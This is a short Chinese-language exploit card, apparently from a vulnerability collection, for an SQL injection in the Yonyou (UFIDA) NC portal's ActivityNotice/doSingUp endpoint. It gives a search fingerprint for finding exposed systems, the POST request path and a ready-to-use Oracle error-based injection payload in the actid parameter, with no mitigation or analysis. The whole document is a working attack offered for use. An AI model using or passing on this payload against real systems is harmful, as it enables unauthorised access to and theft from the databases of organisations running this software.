# 用友NCActivityNotice_doSingUp存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /portal/pt/ActivityNotice/doSingUp HTTP/1.1`

**Payload**
```
pageId=login&pk_psndoc=1&actid=1' AND 7722=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)CHR(122)CHR(106)CHR(98)CHR(113)(SELECT (CASE WHEN (7722=7722) THEN 1 ELSE 0 END) FROM DUAL)CHR(113)CHR(120)CHR(120)CHR(98)CHR(113))-- Jvzs
```
- **响应特征**：200